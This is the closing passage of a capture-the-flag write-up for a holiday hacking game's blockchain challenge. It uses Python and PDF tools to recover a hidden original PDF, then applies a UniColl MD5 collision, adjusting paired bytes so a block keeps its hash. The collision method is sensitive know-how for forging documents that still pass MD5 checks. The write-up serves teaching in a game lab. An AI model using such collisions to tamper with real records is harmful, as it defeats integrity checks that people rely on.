    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;official_public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
        <span class="n">official_public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="c1"># load the chain from the blockchain.dat file</span>
    <span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s1">&#39;blockchain.dat&#39;</span><span class="p">)</span>

     <span class="c1"># compute the SHA-256 of each block</span>
    <span class="n">sha256hashes</span> <span class="o">=</span> <span class="p">[</span><span class="n">block</span><span class="o">.</span><span class="n">full_hash_SHA256</span><span class="p">()</span> <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">chain</span><span class="o">.</span><span class="n">blocks</span><span class="p">]</span>

    <span class="c1"># SHA-256 of Jack&#39;s block</span>
    <span class="n">ALTERED_BLOCK_SHA256</span> <span class="o">=</span> <span class="s2">&#34;58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f&#34;</span>

    <span class="c1"># find the block matching Jack&#39;s SHA-256</span>
    <span class="k">if</span> <span class="n">ALTERED_BLOCK_SHA256</span> <span class="ow">in</span> <span class="n">sha256hashes</span><span class="p">:</span>
        <span class="n">index</span> <span class="o">=</span> <span class="n">sha256hashes</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">ALTERED_BLOCK_SHA256</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;found it boss! it&#39;s the block at index {index}&#34;</span><span class="p">)</span>

    <span class="c1"># retrieve the altered block</span>
    <span class="n">altered_block</span> <span class="o">=</span> <span class="n">chain</span><span class="o">.</span><span class="n">blocks</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</code></pre></div><p>Now, dump the doc of that block:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">altered_block</span><span class="o">.</span><span class="n">dump_doc</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div><p>Note:  I edited the <code>dump_doc</code> method to include the document number in the filename (otherwise, all documents get dumped to the same file, overwriting each other):</p>
<div class="highlight"><pre class="chroma"><code class="language-diff" data-lang="diff">    def dump_doc(self, doc_no):
<span class="gd">-       filename = &#39;%s.%s&#39; % (str(self.index), data_extension[self.data[doc_no - 1][&#39;type&#39;]])
</span><span class="gd"></span><span class="gi">+        filename = &#39;%s-%s.%s&#39; % (str(self.index), doc_no, data_extension[self.data[doc_no - 1][&#39;type&#39;]])
</span></code></pre></div><p>[<a href="scripts/naughty_nice.py">download link</a>] for the complete Python script.</p>
<p>There are two documents in that altered block:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./naughty_nice.py
found it boss! the altered hash is at index 1010
Document dumped as: 129459-0.pdf
Document dumped as: 129459-1.bin
</code></pre></div><p>A PDF of praise for Jack:</p>
<p><img src="img/image-20210103223240457.png" alt="image-20210103223240457"></p>
<p>And a binary blob:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ hd 129459-1.bin
00000000  ea 46 53 40 30 3a 60 79  d3 df 27 62 be 68 46 7c  |.FS@0:`y..&#39;b.hF||
00000010  27 f0 46 d3 a7 ff 4e 92  df e1 de f7 40 7f 2a 7b  |&#39;.F...N.....@.*{|
00000020  73 e1 b7 59 b8 b9 19 45  1e 37 51 8d 22 d9 87 29  |s..Y...E.7Q.&#34;..)|
00000030  6f cb 0f 18 8d d6 03 88  bf 20 35 0f 2a 91 c2 9d  |o........ 5.*...|
00000040  03 48 61 4d c0 bc ee f2  bc ad d4 cc 3f 25 1b a8  |.HaM........?%..|
00000050  f9 fb af 17 1a 06 df 1e  1f d8 64 93 96 ab 86 f9  |..........d.....|
00000060  d5 11 8c c8 d8 20 4b 4f  fe 8d 8f 09              |..... KO....|
0000006c
</code></pre></div><p>Since we know that the blockchain is valid, it means that the altered block somehow has the same MD5 than the original block, probably using a collision attack which allows you to modify some document without changing its MD5.</p>
<h4 id="retrieving-the-original-pdf">Retrieving the original PDF</h4>
<p>We can start comparing that PDF to any other PDF from the blockchain to see the differences.</p>
<p>For example, let&rsquo;s dump the PDF of block 128449:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="c1"># dump the PDF of a normal block</span>
    <span class="n">block_128449</span> <span class="o">=</span> <span class="n">chain</span><span class="o">.</span><span class="n">blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">block_128449</span><span class="o">.</span><span class="n">dump_doc</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div><p>The first thing we can check is the general details of the PDF with <code>pdfinfo</code>:</p>
<blockquote>
<p>pdfinfo - Portable Document Format (PDF) document information extractor</p>
<p>Pdfinfo prints the contents of the &lsquo;Info&rsquo; dictionary (plus some other
useful information) from a Portable Document Format (PDF) file.</p>
<p>~ man pdfinfo</p>
</blockquote>
<p>For the normal PDF:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ pdfinfo 128449-0.pdf
Tagged:         no
UserProperties: no
Suspects:       no
Form:           none
JavaScript:     no
Pages:          1
Encrypted:      no
Page size:      612 x 792 pts (letter)
Page rot:       0
File size:      935 bytes
Optimized:      no
PDF version:    1.3
</code></pre></div><p>But on <code>129459-0.pdf</code> we have loads of errors:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ pdfinfo 129459-0.pdf
Syntax Error (81): Dictionary key must be a name object
Syntax Error (82): Illegal character &lt;aa&gt; in hex string
Syntax Error (83): Illegal character &lt;e5&gt; in hex string
Syntax Error (85): Illegal character &lt;78&gt; in hex string
[...]
JavaScript:     no
Pages:          1
Encrypted:      no
Page size:      612 x 792 pts (letter)
Page rot:       0
File size:      40791 bytes
Optimized:      no
PDF version:    1.3
</code></pre></div><p>We can use <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py"><code>pdf-parser.py</code></a> to have a more closer look at the structure of the PDFs:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./pdf-parser.py 128449-0.pdf &gt; pdfparser_128449
$ ./pdf-parser.py 129459-0.pdf &gt; pdfparser_129459
</code></pre></div><p>Before we dive in, we need some background on the PDF file structure and how collisions works on PDFs!</p>
<ul>
<li><a href="https://gendignoux.com/blog/2016/10/04/pdf-basics.html">https://gendignoux.com/blog/2016/10/04/pdf-basics.html</a></li>
<li><a href="https://www.youtube.com/watch?v=k8FIDGmmYvs">https://www.youtube.com/watch?v=k8FIDGmmYvs</a></li>
<li><a href="https://raw.githubusercontent.com/corkami/pics/master/binary/PDF.png">PDF file structure in one picture</a></li>
</ul>
<p>In particular, <a href="https://github.com/corkami/collisions#pdf">https://github.com/corkami/collisions#pdf</a> and the section <code>PDF collisions with MD5</code> as well as <a href="https://speakerdeck.com/ange/colltris?slide=194">https://speakerdeck.com/ange/colltris?slide=194</a> (reading the whole slide deck is highly recommended!). These show exactly how to create a PDF hiding 2 PDFs:</p>
<p><img src="img/image-20210105095125736.png" alt="image-20210105095125736"></p>
<p>Which means that we should be able to recover the original PDF before Jack&rsquo;s alters. Let&rsquo;s explain how the PDF will be read:</p>
<p><img src="img/image-20210104213550511.png" alt="image-20210104213550511"></p>
<ul>
<li>
<p>We&rsquo;ll start at the end of the PDF, in the trailer with the Root object:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> /Root 1 0 R
</code></pre></div></li>
<li>
<p>Next, we&rsquo;ll check the xref table (just above) to see where in the PDF is the object 1 0</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0000000018
</code></pre></div></li>
<li>
<p>Now, at offset 0x18, we have the \Catalog object which defines the starting object, here object 2:</p>
<p><img src="img/image-20210104213811663.png" alt="image-20210104213811663"></p>
</li>
<li>
<p>Every objects can then reference other objects and form the PDF itself.</p>
</li>
</ul>
<p>A more readable version of  <code>Catalog</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">    /Type /Catalog
    /_Go_Away /Santa
    /Pages &#39;2 0 R      0ùÙ¿W\x8e&lt;ªå\rx\x8fç`ó\x1dd¯ª\x1e¡ò¡=cu&gt;\x1a¥¿\x80bOÃF¿ÖgÊ÷I\x95\x91Ä\x02\x01í«\x03¹ï\x95\x99\x1c[I\x9f\x86Ü\x859\x85\x90\x99\xadT°\x1es?å§¤\x89¹2\x95ÿTh\x03MIy8èù¸Ë:ÃÏPð\x1b2[\x9b\x17tu\x95B+sxð%\x02á©°¬\x85(\x01z\x9e&#39;
  &gt;&gt;
</code></pre></div><p>Probably that <code>Go_Away /Santa</code> comment means we are on the right track! Like in the slide, we are using a path starting with object 2 which gives us the PDF of praises for Jack. But there&rsquo;s an alternative path starting with object 3, that should give us a totally different file!</p>
<p>Using a binary editor, we replace the <code>2</code> by a <code>3</code> and save the file as <code>original.pdf</code>:</p>
<p><img src="img/image-20210104214026856.png" alt="image-20210104214026856"></p>
<p>And we get a totally different PDF with the <em>real</em> story:</p>
<p><img src="img/image-20210104214120425.png" alt="image-20210104214120425"></p>
<h4 id="collisions">Collisions</h4>
<p>So now, we know what we need to modify in the PDF to undo Jack&rsquo;s modification on the PDF. But how can we do that modification and still have the same block hash?</p>
<p>Going back to Ange Albertini&rsquo;s resources:</p>
<ul>
<li><a href="https://github.com/corkami/collisions/blob/master/unicoll.md">https://github.com/corkami/collisions/blob/master/unicoll.md</a></li>
<li><a href="https://speakerdeck.com/ange/colltris?slide=194">https://speakerdeck.com/ange/colltris?slide=194</a></li>
</ul>
<p>PDFs are vulnerable to two types of collisions: unicoll and hashclash. But unicoll is the only one where you can control the difference in a deterministic way.</p>
<p>It works like this:</p>
<p><img src="img/image-20210105175124036.png" alt="image-20210105175124036"></p>
<p>Basically, you can increment the 10th byte in a first block and decrement the 10th byte of the block below without modifying the MD5. And a block is 64 bytes.</p>
<p>Note that we need to do this collision on the block, not only on the PDF, so let&rsquo;s dump the raw block with the <code>save_a_block</code> method:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="n">chain</span><span class="o">.</span><span class="n">save_a_block</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">f</span><span class="s2">&#34;block-129459.dat&#34;</span><span class="p">)</span>
</code></pre></div><p>We can do our first modification: putting back the original PDF in the block.</p>
<ul>
<li>At offset 0x109, we increment the 0x32 to 0x33 to select object 3 in the PDF</li>
<li>At offset 0x149 (which is the next block, 0x109 + 64), we decrement the 0x1C to 0x1B to compensate and keep the same MD5.</li>
</ul>
<p><img src="img/image-20210109180212512.png" alt="image-20210109180212512"></p>
<p>And we can verify that both files have the same MD5:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ md5sum block-129459.dat
b10b4a6bd373b61f32f4fd3a0cdfbf84  block-129459.dat
$ md5sum block-129459-altered1.dat
b10b4a6bd373b61f32f4fd3a0cdfbf84  block-129459-altered1.dat
</code></pre></div><p>And of course, we also need to kick Jack from the Nice list and put him on the Naughty list! Whether or not someone is on the Nice list is controlled by the <code>sign</code> field in the Block class:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">block_data[&#39;sign&#39;]
</code></pre></div><p>It can take these values:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Naughty = 0
Nice = 1
</code></pre></div><p>If we print the altered block:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Chain Index: 129459
              Nonce: a9447e5771c704f4
                PID: 0000000000012fd1
                RID: 000000000000020f
     Document Count: 2
              Score: ffffffff (4294967295)
               Sign: 1 (Nice)
         Data item: 1
</code></pre></div><p>We can see that the sign value  <code>1</code> is stored after a <code>ffffffff</code>, this will help us find the <code>1</code> in the hexadecimal dump of the block, at offset 0x49.</p>
<p>So, for our second modification:</p>
<ul>
<li>at offset 0x49, we decrement 0x31 to 0x30 to transform the Nice into Naughty</li>
<li>at offset 0x89 (0x49 + 64), we increment 0xD6 to 0xD7 to compensate for our modification.</li>
</ul>
<p><img src="img/image-20210109182203723.png" alt="image-20210109182203723"></p>
<p>If our collision is successful, both will still have the same MD5:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ md5sum block-129459-altered1.dat
b10b4a6bd373b61f32f4fd3a0cdfbf84  block-129459-altered1.dat
md5sum block-129459-altered2.dat
b10b4a6bd373b61f32f4fd3a0cdfbf84  block-129459-altered2.dat
</code></pre></div><p>ps: I have no idea why this collision work &ldquo;in reverse&rdquo;, ie decrementing in the first block and incrementing in the second block but it works :&lsquo;D</p>
<p>And we now have our original block!</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sha256sum block-129459-altered2.dat
fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb  block-129459-altered2.dat
</code></pre></div><p>Answer: <code>fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</code></p>
<h1 id="the-end">The End</h1>
<p>Submit the last answer, and travel as yourself to Santa&rsquo;s office to complete the story:</p>
<p><img src="img/puttputtputtputt.png" alt=""></p>
<p>Yay, we saved Christmas and it looks like Jack is going to prison :D</p>

        </div>
    </article>
</div>


<div class="column" id="toc-column">    <aside>
        <div id="toc">
            What's on this page?
            <nav id="TableOfContents">
  <ul>
    <li><a href="#terminals">Terminals</a>
      <ul>
        <li><a href="#terminal-unescape-tmux-pepper-minstix">Terminal Unescape Tmux (Pepper Minstix)</a></li>
        <li><a href="#terminal-kringle-kiosk-shiny-upatree">Terminal Kringle Kiosk (Shiny Upatree)</a></li>
        <li><a href="#terminal-linux-primer-sugarplum-mary">Terminal Linux Primer (Sugarplum Mary)</a></li>
        <li><a href="#santa-portrait">Santa Portrait</a></li>
        <li><a href="#336kbps-fitzy-shortstack">33.6kbps (Fitzy Shortstack)</a></li>
        <li><a href="#terminal-can-bus-investigation-wunorse-openslae">Terminal CAN-Bus Investigation (Wunorse Openslae)</a></li>
        <li><a href="#sort-o-matic-minty-candycane">SORT-O-MATIC (Minty Candycane)</a></li>
        <li><a href="#terminal-scapy-prepper-alabaster-snowball">Terminal Scapy Prepper (Alabaster Snowball)</a></li>
        <li><a href="#arcade-the-elf-c0de-ribb-bonbowford">Arcade The Elf c0de (Ribb Bonbowford)</a>
          <ul>
            <li><a href="#level-1---the-elf-c0de">Level 1 - The Elf C0de</a></li>
            <li><a href="#level-2---trigger-the-yeeter">Level 2 - Trigger The Yeeter</a></li>
            <li><a href="#level-3---move-to-loopiness">Level 3 - Move To Loopiness</a></li>
            <li><a href="#level-4---up-down-loopiness">Level 4 - Up Down Loopiness</a></li>
            <li><a href="#level-5---move-to-madness">Level 5 - Move To Madness</a></li>
            <li><a href="#level-6---two-paths-your-choice">Level 6 - Two Paths, Your Choice</a></li>
            <li><a href="#level-7---yeeter-swirl-bonus">Level 7 - Yeeter Swirl [bonus]</a></li>
            <li><a href="#level-8---for-loop-finale-bonus">Level 8 - For Loop Finale [bonus]</a></li>
          </ul>
        </li>
        <li><a href="#terminal-speaker-unprep-bushy-evergreen">Terminal Speaker UNprep (Bushy Evergreen)</a>
          <ul>
            <li><a href="#door">Door</a></li>
            <li><a href="#lights">Lights</a></li>
            <li><a href="#vending-machines">Vending Machines</a></li>
          </ul>
        </li>
        <li><a href="#terminal-redis-bug-hunt-holly-evergreen">Terminal Redis Bug Hunt (Holly Evergreen)</a>
          <ul>
            <li><a href="#solution">Solution</a></li>
          </ul>
        </li>
        <li><a href="#arcade-snowball-game-tangle-coalbox">Arcade Snowball Game (Tangle Coalbox)</a>
          <ul>
            <li><a href="#solution-1">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#objectives">Objectives</a>
      <ul>
        <li><a href="#1-uncover-santas-gift-list-">1. Uncover Santa&rsquo;s Gift List 🎄</a>
          <ul>
            <li><a href="#solution-2">Solution</a></li>
          </ul>
        </li>
        <li><a href="#2-investigate-s3-bucket-">2. Investigate S3 Bucket 🎄</a>
          <ul>
            <li><a href="#solution-3">Solution</a></li>
          </ul>
        </li>
        <li><a href="#3-point-of-sale-password-recovery-">3. Point-of-Sale Password Recovery 🎄</a>
          <ul>
            <li><a href="#solution-4">Solution</a></li>
          </ul>
        </li>
        <li><a href="#4-operate-the-santavator-">4. Operate the Santavator 🎄🎄</a>
          <ul>
            <li><a href="#solution-5">Solution</a></li>
          </ul>
        </li>
        <li><a href="#5-open-hid-lock-">5. Open HID Lock 🎄🎄</a>
          <ul>
            <li><a href="#solution-6">Solution</a></li>
          </ul>
        </li>
        <li><a href="#6-splunk-challenge-">6. Splunk Challenge 🎄🎄🎄</a>
          <ul>
            <li><a href="#training-question-1">Training Question 1</a></li>
            <li><a href="#training-question-2">Training Question 2</a></li>
            <li><a href="#training-question-3">Training Question 3</a></li>
            <li><a href="#training-question-4">Training Question 4</a></li>
            <li><a href="#training-question-5">Training Question 5</a></li>
            <li><a href="#training-question-6">Training Question 6</a></li>
            <li><a href="#training-question-7">Training Question 7</a></li>
            <li><a href="#challenge-question">Challenge Question</a></li>
          </ul>
        </li>
        <li><a href="#7-solve-the-sleighs-can-d-bus-problem-">7. Solve the Sleigh&rsquo;s CAN-D-BUS Problem 🎄🎄🎄</a>
          <ul>
            <li><a href="#solution-7">Solution</a></li>
          </ul>
        </li>
        <li><a href="#8-broken-tag-generator-">8. Broken Tag Generator 🎄🎄🎄🎄</a>
          <ul>
            <li><a href="#solution-8">Solution</a></li>
          </ul>
        </li>
        <li><a href="#9-arp-shenanigans-">9. ARP Shenanigans 🎄🎄🎄🎄</a>
          <ul>
            <li><a href="#solution-9">Solution</a></li>
          </ul>
        </li>
        <li><a href="#10-defeat-fingerprint-sensor-">10. Defeat Fingerprint Sensor 🎄🎄🎄</a>
          <ul>
            <li><a href="#solution-10">Solution</a></li>
          </ul>
        </li>
        <li><a href="#11a-naughtynice-list-with-blockchain-investigation-part-1-">11a. Naughty/Nice List with Blockchain Investigation Part 1 🎄🎄🎄🎄🎄</a>
          <ul>
            <li><a href="#solution-11">Solution</a></li>
          </ul>
        </li>
        <li><a href="#11b-naughtynice-list-with-blockchain-investigation-part-2-">11b. Naughty/Nice List with Blockchain Investigation Part 2 🎄🎄🎄🎄🎄</a>
          <ul>
            <li><a href="#solution-12">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#the-end">The End</a></li>
  </ul>
</nav>
        </div>
    </aside>

</div>

</div></div>
            </div><footer class="footer">
  <div class="content has-text-centered">
    <p>
        <div class="copyright">
        
            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
        
        </div>

    </p>
  </div>

  <div id="to-top">
    <a href="#logo" class="top-btn no-squiggly">^</a>
  </div>

</footer>
</div>
    </body>
</html>
